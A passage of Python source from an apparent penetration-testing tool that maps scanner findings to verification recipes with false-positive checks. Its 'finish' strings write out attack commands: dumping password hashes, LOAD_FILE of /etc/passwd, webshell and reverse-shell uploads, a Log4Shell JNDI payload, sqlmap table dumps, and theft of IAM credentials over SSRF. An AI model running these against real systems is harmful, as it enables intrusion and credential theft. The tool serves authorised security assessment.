               "...') to reach internal DBs; SSRF arbitrary host:port (within ROE).",
     "fp": "The role can't use/create the extension and no foreign server is configured.",
     "fn": _v_postgres},
    {"id": "postgres-access",
     "match": r"postgresql trust authentication|postgresql credentialed access",
     "name": "PostgreSQL unauthenticated / credentialed access",
     "pre": ["PostgreSQL (5432) reachable", "trust auth or a working credential"],
     "finish": "psql 'host=<ip> port=<port> user=<u>' then \\l ; \\du ; SELECT "
               "usename,passwd FROM pg_shadow (recce already read these).",
     "fp": "The login was actually rejected (recce would not have raised this).",
     "fn": _v_postgres},
    {"id": "mysql-file-priv",
     "match": r"mysql file privilege|load_file|into outfile",
     "name": "MySQL FILE privilege (file read/write -> RCE)",
     "pre": ["MySQL (3306) reachable", "The account holds the FILE privilege"],
     "finish": "mysql -e \"SELECT LOAD_FILE('/etc/passwd')\" (read); INTO OUTFILE a "
               "webshell; or a lib_mysqludf_sys UDF into a writable @@plugin_dir (ROE).",
     "fp": "secure_file_priv is NULL and the plugin dir is not writable.",
     "fn": _v_mysql},
    {"id": "mysql-datamine",
     "match": r"mysql sensitive data|mysql.*(pii|secrets|credentials)",
     "name": "MySQL sensitive data exposed",
     "pre": ["MySQL (3306) reachable", "Read access to databases with sensitive columns"],
     "finish": "mysql -e 'SELECT * FROM <db>.<table> LIMIT 100' to pull the full rows; "
               "spray harvested connection strings (ROE).",
     "fp": "The flagged columns hold non-sensitive data despite their names.",
     "fn": _v_mysql},
    {"id": "mysql-access",
     "match": r"mysql '.*' login with empty password|mysql credentialed access|"
              r"mysql.*empty password",
     "name": "MySQL empty-password / credentialed access",
     "pre": ["MySQL (3306) reachable", "empty-password or a working credential"],
     "finish": "mysql -h <ip> -u <u> ; SELECT user,authentication_string FROM mysql.user "
               "(recce already read these).",
     "fp": "The login was actually rejected (recce would not have raised this).",
     "fn": _v_mysql},
    {"id": "elasticsearch-unauth",
     "match": r"elasticsearch exposed without authentication|elasticsearch.*(no auth|unauth)|"
              r"elasticsearch end-of-life|elasticsearch.*legacy build",
     "name": "Elasticsearch exposed without authentication",
     "pre": ["Elasticsearch (9200/9201) reachable", "/_cat/indices answered with no credential"],
     "finish": "curl -s http://<ip>:<port>/_cat/indices then _search / elasticdump to "
               "pull documents (recce already listed them).",
     "fp": "The cluster actually enforced security (401).",
     "fn": _v_elasticsearch},
    {"id": "rsync-unauth",
     "match": r"rsync module readable without authentication|"
              r"rsync modules enumerable|rsync.*(no auth|unauth|anonymous)",
     "name": "rsync exposed without authentication",
     "pre": ["rsync daemon (873) reachable", "module list / module answered with no credential"],
     "finish": "rsync --list-only rsync://<ip>:<port>/<module>/ then rsync -av ... loot/ "
               "(recce already read the OK verdict).",
     "fp": "The daemon actually required auth (AUTHREQD).",
     "fn": _v_rsync},
    {"id": "nfs-export",
     "match": r"nfs export shared to any host|world-mountable|"
              r"nfs exports enumerable|rpc services enumerable via portmapper",
     "name": "NFS export exposed",
     "pre": ["portmapper (111) / mountd reachable", "export list answered with no credential"],
     "finish": "showmount -e <ip> then mount -o vers=3 <ip>:<export> /mnt  (recce "
               "already read the export list).",
     "fp": "The export is actually restricted to specific hosts.",
     "fn": _v_nfs},
    {"id": "asrep-roast",
     "match": r"as-rep roastable account|kerberos username enumeration|"
              r"pre-auth disabled",
     "name": "AS-REP roastable account / Kerberos user enumeration",
     "pre": ["DC (88) reachable", "AS-REP returned / username validated with no credential"],
     "finish": "hashcat -m 18200 asrep.hash rockyou.txt (roast), or GetNPUsers -no-pass "
               "(enum) - recce already captured the reply.",
     "fp": "The account actually required pre-auth (no AS-REP would be issued).",
     "fn": _v_kerberos},
    {"id": "ftp-backdoor",
     "match": r"vsftpd 2\.3\.4|proftpd.*backdoor|ftp.*backdoor|mod_copy|cve-2015-3306",
     "name": "Backdoored / RCE FTP build",
     "pre": ["FTP reachable", "Banner matches a known trojaned/RCE build"],
     "finish": "trigger the backdoor/RCE non-destructively (see evidence), or the "
               "referenced metasploit module in ROE.",
     "fp": "A distro rebuilt the version in place without the backdoor / with the "
           "module disabled.",
     "fn": _v_ftp_backdoor},
    {"id": "anon-ftp", "match": r"anonymous ftp|ftp.*anonymous|anonymous login",
     "name": "Anonymous FTP login",
     "pre": ["FTP (21) reachable", "Anonymous login permitted"],
     "finish": "ftp <ip> -> user 'anonymous', blank password (expect a 230 response).",
     "fp": "A 530 login-incorrect response -> FP.",
     "fn": _v_anon_ftp},
    {"id": "weak-tls", "match": r"weak (ssl|tls|cipher)|sslv[23]|tls ?1\.0|tls ?1\.1|poodle|beast|"
                                r"deprecated tls|rc4|null cipher|export cipher",
     "name": "Weak SSL/TLS protocol or cipher",
     "pre": ["The service negotiates a deprecated protocol/cipher"],
     "finish": "sslscan <ip>:<port>  or  openssl s_client -connect <ip>:<port> -tls1  (a successful "
               "handshake on the weak protocol confirms it).",
     "fp": "Rarely a FP - it is a direct observation. Judge business impact, not existence.",
     "fn": _v_weak_tls},
    {"id": "printnightmare", "match": r"printnightmare|cve-2021-34527|cve-2021-1675|spooler.*rce|"
                                      r"rpcaddprinterdriver",
     "name": "PrintNightmare (CVE-2021-34527 / 1675, Print Spooler)",
     "pre": ["Print Spooler service running", "Point-and-Print allows non-admin driver install "
             "(NoWarningNoElevationOnInstall=1) OR the host is unpatched"],
     "finish": "rpcdump.py @<ip> | egrep 'MS-RPRN|MS-PAR' to confirm the interface; then the public PoC "
               "(cube0x0 CVE-2021-1675.py for RCE via a share, or Benjamin Delpy's for the LPE) - in ROE.",
     "fp": "Spooler disabled/stopped, or fully patched (Aug-2021+ with Point-and-Print locked down), or "
           "not a Windows host.",
     "fn": _v_printnightmare},
    {"id": "bluekeep", "match": r"bluekeep|cve-2019-0708|rdp.*(pre-?auth|remote code)",
     "name": "BlueKeep RDP pre-auth RCE (CVE-2019-0708)",
     "pre": ["RDP (3389) reachable", "OS is XP/2003/Vista/7/2008/2008R2"],
     "finish": "rdpscan <ip> (safe check mode) or msf auxiliary/scanner/rdp/cve_2019_0708_bluekeep (CHECK) "
               "to confirm; the exploit can bugcheck the host -> lab / ROE with a restore plan.",
     "fp": "Windows 8 / Server 2012 or newer (not affected), or RDP not reachable.",
     "fn": _v_bluekeep},
    {"id": "heartbleed", "match": r"heartbleed|cve-2014-0160|ssl-heartbleed",
     "name": "Heartbleed OpenSSL memory disclosure (CVE-2014-0160)",
     "pre": ["TLS service using OpenSSL 1.0.1 - 1.0.1f"],
     "finish": "nmap --script ssl-heartbleed -p<port> <ip> (non-intrusive; VULNERABLE = real). It leaks a "
               "small memory chunk - safe to run, and the leaked bytes are the proof.",
     "fp": "The NSE check says NOT VULNERABLE (patched OpenSSL, or not OpenSSL).",
     "fn": _v_heartbleed},
    {"id": "log4shell", "match": r"log4shell|log4j|cve-2021-44228|cve-2021-45046|jndi",
     "name": "Log4Shell JNDI RCE (CVE-2021-44228)",
     "pre": ["A Java app that logs attacker-controlled input via a vulnerable log4j (2.0-2.14.1)"],
     "finish": "inject ${jndi:ldap://<your-oob-listener>/x} into every input and watch a DNS/LDAP listener "
               "you own (interactsh) for a callback; then the public PoC to escalate a confirmed hit - in ROE.",
     "fp": "No OOB callback from any injection point -> not vulnerable or egress-filtered.",
     "fn": _v_log4shell},
    {"id": "zerologon", "match": r"zerologon|cve-2020-1472|netlogon.*(privilege|elevation)",
     "name": "ZeroLogon Netlogon privilege escalation (CVE-2020-1472)",
     "pre": ["Target is a Domain Controller", "DC unpatched (pre Aug-2020)"],
     "finish": "zerologon_tester.py <DC-netbios-name> <ip> (DETECTION-only - it stops before changing "
               "anything). Full PoC resets the machine-account password: lab / ROE with a restore plan only.",
     "fp": "Not a Domain Controller, or the DC is patched.",
     "fn": _v_zerologon},
    {"id": "kerberoast", "match": r"kerberoast",
     "name": "Kerberoastable service account (SPN)",
     "pre": ["A domain account with a servicePrincipalName", "Any valid domain credential to request the TGS"],
     "finish": "impacket-GetUserSPNs <dom>/<user>:<pass> -request  ->  hashcat -m 13100.",
     "fp": "Existence is confirmed by the query; the only question is whether the ticket cracks "
           "(strong / gMSA passwords won't).",
     "fn": _v_kerberoast},
    {"id": "asrep", "match": r"as-?rep roast",
     "name": "AS-REP roastable account (no pre-auth)",
     "pre": ["A domain account with Kerberos pre-authentication disabled"],
     "finish": "impacket-GetNPUsers <dom>/ -usersfile <users> -no-pass  ->  hashcat -m 18200.",
     "fp": "Existence is confirmed by the query; the only question is whether the hash cracks.",
     "fn": _v_asrep},
    {"id": "web-auth-session",
     "match": r"authenticated web session obtained",
     "name": "Authenticated web session via harvested credential (reuse)",
     "pre": ["A harvested credential", "A login form that accepted it"],
     "finish": "Operate as the user; escalate via authenticated findings; reuse the "
               "credential against SSH/SMB/other apps (within ROE).",
     "fp": "The session isn't actually authenticated (unlikely given the success signal).",
     "fn": _v_authsession},
    {"id": "web-debug",
     "match": r"interactive debugger exposed|laravel ignition|django debug=true|"
              r"symfony web profiler|rails debug exception|whoops debug page|"
              r"debug=true \(",
     "name": "Framework debug mode exposed (RCE / secret disclosure)",
     "pre": ["A debug page / debugger endpoint answered", "Debug mode is on in production"],
     "finish": "Werkzeug console / Ignition CVE-2021-3129 -> RCE; else harvest the leaked "
               "SECRET_KEY / DB creds / source (within ROE).",
     "fp": "A static error template rather than the live debug view.",
     "fn": _v_debug},
    {"id": "web-takeover",
     "match": r"potential subdomain takeover",
     "name": "Subdomain takeover (dangling DNS)",
     "pre": ["A dangling DNS record", "The pointed service's unclaimed-resource page"],
     "finish": "Claim the resource at the third-party service for this exact name; serve "
               "content on the domain (phishing / cookie theft / OAuth abuse) in ROE.",
     "fp": "The DNS record was removed between the fetch and now.",
     "fn": _v_takeover},
    {"id": "web-csp",
     "match": r"weak content-security-policy",
     "name": "Weak Content-Security-Policy",
     "pre": ["A CSP header is present", "It contains a bypass (unsafe-inline / wildcard)"],
     "finish": "Chain with any reflected/stored input - the weak CSP lets the payload "
               "execute (see the XSS/SSTI findings).",
     "fp": "The policy is actually adequate for the app's needs.",
     "fn": _v_csp},
    {"id": "web-xxe",
     "match": r"xml external entity \(xxe\)",
     "name": "XML External Entity (XXE) file read",
     "pre": ["An XML endpoint that resolves external entities", "The file content returned"],
     "finish": "Read config/secrets/source via file://; pivot to SSRF (metadata/internal); "
               "OOB-exfiltrate non-text files (within ROE).",
     "fp": "None - the returned file content proves entity resolution.",
     "fn": _v_xxe},
    {"id": "web-upload",
     "match": r"file upload to .* code execution|unrestricted file upload|"
              r"file-upload form present",
     "name": "Unrestricted file upload (webshell / RCE)",
     "pre": ["An upload accepts an attacker-named/typed file",
             "The stored file is reachable (and, for RCE, executed) over HTTP"],
     "finish": "Upload a real webshell/reverse shell at the proven path for a foothold, "
               "then delete the artifact (within ROE).",
     "fp": "The upload may be validated or served from a non-executing store - the active "
           "--upload-shell test (computed marker echoed back) settles it.",
     "fn": _v_upload},
    {"id": "web-smuggle",
     "match": r"request smuggling|cl\.te|te\.cl|desync",
     "name": "HTTP request smuggling (CL.TE / TE.CL desync)",
     "pre": ["Both Content-Length and Transfer-Encoding are accepted",
             "Front-end and back-end frame the body differently (timing stall)"],
     "finish": "Send a full desync (smuggled prefix) OUT of a shared cache and observe it "
               "prepended to another request (Burp HTTP Request Smuggler).",
     "fp": "A slow back-end can also stall; the fast control + two-try repeat reduce but "
           "don't eliminate it - confirm with a real desync.",
     "fn": _v_smuggle},
    {"id": "web-cache-poison",
     "match": r"cache poisoning via unkeyed header|web cache poisoning",
     "name": "Web cache poisoning (unkeyed header reflection)",
     "pre": ["An unkeyed header reflects into the response",
             "The response is cacheable (proxy cache / shared-cacheable Cache-Control)"],
     "finish": "Land the reflected value in a cached entry (Burp Param Miner; confirm "
               "X-Cache: hit) and weaponise the reflection - within ROE, non-shared cache.",
     "fp": "The value reflects but that URL is not actually cached (keyed/vary differently) "
           "- confirm a second request returns the poisoned copy from cache.",
     "fn": _v_cache_poison},
    {"id": "web-deserial",
     "match": r"serialized object in client-controllable|viewstate is not encrypted|"
              r"deserializ",
     "name": "Insecure deserialization surface (Java / PHP / .NET ViewState)",
     "pre": ["A serialized-object marker appears in cookie/hidden-field input",
             "The server deserializes client-supplied data"],
     "finish": "Replay with a ysoserial / PHPGGC / ysoserial.net payload and confirm a "
               "benign side effect (sleep/callback/file) in ROE = RCE.",
     "fp": "The app may re-serialize its own state and never deserialize your copy - "
           "tamper the value and watch for a deserialization error to confirm the sink.",
     "fn": _v_deserial},
    {"id": "web-nosqli",
     "match": r"nosql injection authentication bypass",
     "name": "NoSQL injection authentication bypass",
     "pre": ["A login form", "Operator payloads logged in without valid credentials"],
     "finish": "Log in as the first/admin user with the operator payload; enumerate other "
               "users with a regex/`$where` injection (within ROE).",
     "fp": "The 'success' response wasn't actually authenticated (recce baselined a wrong "
           "credential to guard this).",
     "fn": _v_authbypass_nosql},
    {"id": "web-cmdi",
     "match": r"os command injection in ",
     "name": "OS command injection (RCE)",
     "pre": ["A parameter is passed to a shell", "A computed marker / scaled delay observed"],
     "finish": "Swap the echo/sleep for `id` then a reverse shell - RCE as the web "
               "service account; pivot from there (within ROE).",
     "fp": "None for the output-based case (a shell-computed value proves execution).",
     "fn": _v_cmdi},
    {"id": "web-ssrf",
     "match": r"server-side request forgery via",
     "name": "Server-Side Request Forgery (SSRF)",
     "pre": ["A URL parameter is fetched server-side", "Metadata/file content returned"],
     "finish": "Pull IAM role creds via /latest/meta-data/iam/security-credentials/ through "
               "the same param; reach internal services; try gopher:// (within ROE).",
     "fp": "A proxy legitimately returns the content to the client.",
     "fn": _v_ssrf},
    {"id": "api-access",
     "match": r"idor / bola|reachable without authentication \(broken auth|"
              r"broken object level|api endpoints reachable without",
     "name": "API broken auth / IDOR (BOLA)",
     "pre": ["An OpenAPI/Swagger spec was enumerated", "Endpoints answered unauthenticated"],
     "finish": "Call the full surface with no token (the spec maps it); enumerate objects "
               "by id and mine the returned data (within ROE).",
     "fp": "The endpoints legitimately allow anonymous access despite the spec.",
     "fn": _v_api_access},
    {"id": "web-app-unauth",
     "match": r"jenkins script console|keycloak admin console|grafana.*(traversal|file read)|"
              r"elasticsearch readable|vault reachable|kibana status endpoint|"
              r"default [\w /]*credential",
     "name": "Exposed application (unauthenticated access / default credentials)",
     "pre": ["The application endpoint is reachable",
             "No authentication enforced, or a documented default credential was accepted"],
     "finish": "Log in / re-read with the command in the finding, then pivot per the "
               "evidence (RCE, file read, data dump, or account takeover).",
     "fp": "The endpoint actually required valid credentials (recce would not have raised it).",
     "fn": _v_web_app},
    {"id": "web-exposure", "match": r"exposed (git|\.git|svn|\.env|\.svn|\.ds_store|aws|backup)|"
                                    r"\.env file|\.git/config|mod_status exposed|mod_info exposed|"
                                    r"actuator|heapdump|gateway actuator|backup/source file|phpinfo|"
                                    r"web\.config readable|directory listing enabled|swagger|"
                                    r"\.ds_store|crossdomain|prometheus /metrics|\.htpasswd|"
                                    r"graphql introspection|graphql field-suggestion|"
                                    r"graphql query batching|cors reflects|cors allows the null|"
                                    r"user enumeration via rest|"
                                    r"secret in client-side js|wordpress .*(present|detected)|xml-rpc|"
                                    r"source map|\.git reconstructed|source tree",
     "name": "Web exposure (VCS / config / status endpoint)",
     "pre": ["The resource is reachable and returns the sensitive content"],
     "finish": "curl -sk <url>/<path> to re-read it; for a .git repo: git-dumper <url>/.git ./loot "
               "then review the source/secrets. Web tab has whatweb/nikto/nuclei for the rest.",
     "fp": "It's an observation - the probe already fetched it. The only nuance is whether the exposed "
           "content is actually sensitive.",
     "fn": _v_web_exposure},
    {"id": "web-lfi",
     "match": r"path traversal / local file read|local file (read|inclusion)|\blfi\b",
     "name": "Path traversal / local file read",
     "pre": ["A parameter names a file/path", "recce read a system file's contents back"],
     "finish": "curl --path-as-is '<url>?<param>=../../../../etc/passwd' to re-read; then "
               "pull app secrets / source (recce already proved the read).",
     "fp": "The returned content was static page text (recce matched the file's own signature).",
     "fn": _v_lfi},
    {"id": "web-openredirect",
     "match": r"open redirect via ",
     "name": "Open redirect",
     "pre": ["A parameter is reflected into the redirect target",
             "recce observed a 3xx Location pointing at an attacker host"],
     "finish": "re-issue the request with the param set to your host; use for phishing / "
               "OAuth token smuggling within ROE.",
     "fp": "The app hard-limits the final destination despite the reflected Location (rare).",
     "fn": _v_open_redirect},
    {"id": "web-sqli",
     "match": r"sql injection in |\bsqli\b|error-based, (mysql|postgresql|mssql|oracle|sqlite)",
     "name": "SQL injection",
     "pre": ["A parameter/field reaches a SQL query unsanitised",
             "recce observed the database respond to injected SQL"],
     "finish": "sqlmap -u '<url>' -p '<param>' --batch --dbs  (add --data for POST), then "
               "--dump the sensitive tables - recce already proved the injection.",
     "fp": "The error/differential/delay was environmental (recce re-tested to exclude that).",
     "fn": _v_sqli},
    {"id": "web-ssti", "match": r"server-side template injection|\bssti\b|template engine (executed|evaluated)",
     "name": "Server-Side Template Injection (SSTI)",
     "pre": ["User input is rendered by a server-side template engine"],
     "finish": "tplmap -u '<url>?rc=*'  to identify the engine and get RCE; or the engine-specific "
               "payload (Jinja2 {{config}}, Freemarker, ERB) - within ROE.",
     "fp": "Very low - the engine already evaluated 7*7 to 49. Confirm the engine for the RCE payload.",
     "fn": _v_ssti},
    {"id": "web-jwt", "match": r"jwt (accepts|uses|hmac secret cracked)|alg:none|"
                               r"algorithm-confusion|algorithm confusion|json web token|hmac secret cracked",
     "name": "JWT weakness (alg:none / weak secret / confusion)",
     "pre": ["The app trusts a JWT whose signature can be forged or cracked"],
     "finish": "jwt_tool <token> -X a (alg:none) / -C -d rockyou.txt (crack HS256) / -X k (RS256->HS256), "
               "then replay the forged token.",
     "fp": "The server pins the algorithm / rejects the forged token, or the secret is strong.",
     "fn": _v_jwt},
    {"id": "web-methods", "match": r"dangerous http methods|http method.*enabled|put.*enabled|"
                                   r"arbitrary file write via http put|file write via http put",
     "name": "Dangerous HTTP methods (PUT/DELETE/TRACE)",
     "pre": ["The server advertises a write/dangerous method in OPTIONS Allow"],
     "finish": "curl -sk -X PUT <url>/recce_poc.txt -d 'recce_poc' ; curl -sk <url>/recce_poc.txt "
               "(a stored file = real). Remove it afterwards.",
     "fp": "PUT is advertised but returns 403/405 when actually invoked.",
     "fn": _v_web_methods},
    {"id": "default-creds", "match": r"default .{0,24}(credential|password|login|creds)|"
                                     r"weak credential|default (user|account)",
     "name": "Default / weak credentials",
     "pre": ["A service reachable with a known default or weak credential"],
     "finish": "nxc <proto> <ip> -u <default-user> -p <default-pass> (respect account-lockout), or the "
               "product's documented default login.",
     "fp": "The known defaults all fail to authenticate.",
     "fn": _v_default_creds},
    # --- version->CVE matches from the offline DB (gap-1 coverage) ---
    {"id": "openssh-regresshion", "match": r"regresshion|cve-2024-6387",
     "name": "OpenSSH regreSSHion pre-auth RCE (CVE-2024-6387)",
     "pre": ["OpenSSH 8.5p1..<9.8p1 (or <4.4p1)", "glibc Linux", "fix not backported"],
     "finish": "compare the distro's OpenSSH package version to the patched build, or run "
               "the public regreSSHion detector; full PoC is noisy / can crash sshd - lab/ROE.",
     "fp": "OpenSSH >= 9.8p1 (patched), the 4.4p1..8.5p1 window, a non-glibc/backported build.",
     "fn": _v_openssh_regresshion},
    {"id": "openssh-version-cve",
     "match": r"openssh.{0,40}(double-free|username enum|user enumeration|cve-2023-38408|"
              r"cve-2016-0777|agent)",
     "name": "OpenSSH version-based CVE",
     "pre": ["OpenSSH version in the affected range", "fix not backported by the distro"],
     "finish": "check the distro's patched-package version; for the double-free, the public "
               "PoC needs a specific heap layout (lab). Username-enum: a timing check with "
               "a wordlist confirms it.",
     "fp": "A backported/patched build that resists the check.",
     "fn": _v_version_cve},
    {"id": "apache-httpd-version-cve",
     "match": r"apache (httpd|2\.4).{0,50}(smuggl|ssrf|mod_proxy|mod_lua|traversal|"
              r"cve-2021-41773|cve-2021-42013|cve-2022-2\d{4})",
     "name": "Apache httpd version-based CVE",
     "pre": ["Apache httpd version in the affected range"],
     "finish": "for path traversal (2.4.49/50): curl --path-as-is <url>/cgi-bin/.%2e/.%2e/"
               "etc/passwd (a 200 with root:x = CONFIRMED). For smuggling/SSRF: the specific "
               "CVE PoC / a smuggling test harness.",
     "fp": "A backported build, or the vulnerable module/config (mod_cgi, mod_proxy) not enabled.",
     "fn": _v_version_cve},
    {"id": "nginx-version-cve", "match": r"nginx.{0,40}(off-by-one|resolver|cve-2021-23017)",
     "name": "nginx resolver off-by-one (CVE-2021-23017)",
     "pre": ["nginx 0.6.18..<1.21.0", "the 'resolver' directive is configured"],
     "finish": "confirm a 'resolver' directive is in use (the bug is in DNS resolution); "
               "then the public PoC in a lab (it can crash the worker).",
     "fp": "No 'resolver' configured, or a patched/backported build.",
     "fn": _v_version_cve},
    {"id": "mysql-version-cve", "match": r"mysql 5\.5.{0,30}(pre-?auth|remote)",
     "name": "MySQL 5.5.x remote pre-auth issue",
     "pre": ["MySQL 5.5.x reachable"],
     "finish": "nmap --script mysql-vuln-cve2012-2122 -p3306 <ip> (the auth-bypass check), "
               "or mysql -h <ip> -u root with the repeated-login bypass.",
     "fp": "A patched 5.5.x (>= 5.5.63) or a MariaDB build mis-detected as MySQL 5.5.",
     "fn": _v_version_cve},
    {"id": "eol-service",
     # Only a PURE end-of-life note - if the same finding also names an RCE or a CVE
     # (e.g. "Legacy Samba 3.x - multiple RCE"), don't swallow it here with "just
     # upgrade"; let it fall through to a version-CVE verdict that keeps it actionable.
     "match": r"^(?!.*(?:\brce\b|remote code|cve-\d)).*?"
              r"(?:end-of-life|end of life|\beol\b|\blegacy\b|unsupported|no longer supported)",
     "name": "End-of-life / unsupported software exposed",
     "pre": ["The running build's branch is out of vendor support"],
     "finish": "confirm the exact build (nmap -sV) and check it against the vendor's "
               "lifecycle page; the finding is the unsupported software itself.",
     "fp": "A version mis-detection (e.g. MariaDB read as MySQL 5.5); otherwise it is a fact.",
     "fn": _v_eol},
    {"id": "redis-version-cve", "match": r"redis.{0,30}(< ?6|no acl|unauth|rce)",
     "name": "Redis < 6.0 - no ACLs / common unauth RCE",
     "pre": ["Redis reachable", "no ACL/AUTH (pre-6.0 default)"],
     "finish": "redis-cli -h <ip> ping (a PONG without AUTH = unauthenticated); then CONFIG "
               "GET dir / module load techniques for RCE (lab/ROE).",
     "fp": "AUTH is required (requirepass set) or protected-mode blocks remote access.",
     "fn": _v_version_cve},
    {"id": "exchange-proxylogon", "match": r"proxylogon|proxyshell|exchange.{0,30}(exposed|owa|"
                                           r"cve-2021-26855|cve-2021-34473)",
     "name": "Microsoft Exchange - ProxyLogon / ProxyShell risk",
     "pre": ["Internet/intranet-facing Exchange/OWA", "CU/patch level below the fixed build"],
     "finish": "map the OWA build string to its CU/patch date vs Microsoft's fixed builds, "
               "or run the ProxyLogon/ProxyShell checker in check-only mode.",
     "fp": "A fully-patched Exchange that resists the checks.",
     "fn": _v_exchange},
    # Catch-all, LAST so every specific recipe wins first: any remaining finding that
    # names a CVE or RCE (SambaCry, Ghostcat, Drupalgeddon, appliance CVEs, ...) still
    # gets an honest version-based verdict instead of silently having NO Verification row.
    {"id": "version-cve-generic",
     "match": r"cve-\d{4}-\d+|remote code execution|\brce\b|pre-?auth\w* (?:rce|bypass)",
     "name": "Version-based CVE (offline DB match)",
     "pre": ["The observed product/version falls in the CVE's affected range",
             "the distro has not backported the fix"],
     "finish": "map the exact build to the CVE's fixed version (vendor advisory / distro "
               "changelog), then run the CVE's published check/PoC within a lab / ROE.",
     "fp": "A backported or patched build that resists the check, or a version mis-detection.",
     "fn": _v_version_cve},
]
_COMPILED = [(re.compile(r["match"], re.I), r) for r in _RECIPES]


def _blob(vuln: Vuln) -> str:
    return " ".join([vuln.title or "", vuln.script_id or "",
                     " ".join(vuln.ids or []), vuln.output or ""]).lower()


def recipe_for(vuln: Vuln) -> dict | None:
    b = _blob(vuln)
    for rx, r in _COMPILED:
        if rx.search(b):
            return r
    return None


def _synthetic(ip: str, text: str, source: str) -> Vuln:
    """A minimal Vuln wrapper so a recipe can run over an exploit/local-finding
    that isn't itself a Vulnerabilities-sheet row."""
    return Vuln(ip=ip, port=None, protocol="tcp", script_id=source, title=text,
                output=text, source=source)


def verify_host(host: Host) -> list[dict]:
    """Every proof-able finding on a host -> a verdict record. Scans the
    Vulnerabilities, on-target local findings and mapped exploits, deduped by
    (recipe, port)."""
    out: list[dict] = []
    seen: set[tuple] = set()

    def emit(vuln: Vuln):
        r = recipe_for(vuln)
        if not r:
            return
        key = (r["id"], vuln.port)
        if key in seen:
            return
        seen.add(key)
        port = _port_of(host, vuln)
        verdict, evidence = r["fn"](host, port, vuln)
        # Safety net for over-claiming verdicts. Some recipes return CONFIRMED with
        # ACCESS language ("recce read the API with no credential", "authenticated
        # with a default credential", "sent INFO ... no authentication and the server
        # returned") - true only when recce actually probed. When the finding is just
        # a version-db BANNER match (source "version-db", never a live probe), recce
        # ran no such request, so cap it at LIKELY. EOL/version-fact verdicts speak of
        # a "directly-observed build" (the banner IS the proof) and don't use this
        # access phrasing, so they stay CONFIRMED; genuine live-probe findings aren't
        # source "version-db", so they're untouched too.
        if verdict == CONFIRMED and vuln.source == "version-db" \
                and _LIVE_ACCESS_RE.search(" ".join(evidence)):
            verdict = LIKELY
            action = list(evidence[1:]) if len(evidence) > 1 else []
            evidence = ["Version/advisory match only - recce did NOT authenticate or "
                        "read this service live; treat it as a lead to verify, not a "
                        "confirmed observation.", *action]
        out.append({
            "ip": host.ip, "port": vuln.port, "vuln": r["name"],
            "finding": vuln.title or vuln.script_id or r["name"],
            "verdict": verdict, "evidence": evidence,
            "preconditions": r["pre"], "finish": r["finish"], "fp": r["fp"],
            "key": f"verify:{host.ip}:{vuln.port or 0}:{r['id']}"})

    for v in host.vulns:
        emit(v)
    for f in getattr(host, "local_findings", []) or []:
        emit(_synthetic(host.ip, f.get("vector", ""), "local"))
    for e in getattr(host, "exploits", []) or []:
        emit(_synthetic(host.ip, f"{e.title} {e.product}", "exploit"))
    # Verdict order: real first, noise last.
    order = {CONFIRMED: 0, LIKELY: 1, INCONCLUSIVE: 2, FALSE_POSITIVE: 3}
    out.sort(key=lambda r: order.get(r["verdict"], 9))
    return out


def verify_hosts(hosts: list[Host]) -> list[dict]:
    out: list[dict] = []
    for h in hosts:
        out.extend(verify_host(h))
    return out


def summary(results: list[dict]) -> dict[str, int]:
    counts = {CONFIRMED: 0, LIKELY: 0, INCONCLUSIVE: 0, FALSE_POSITIVE: 0}
    for r in results:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
    return counts
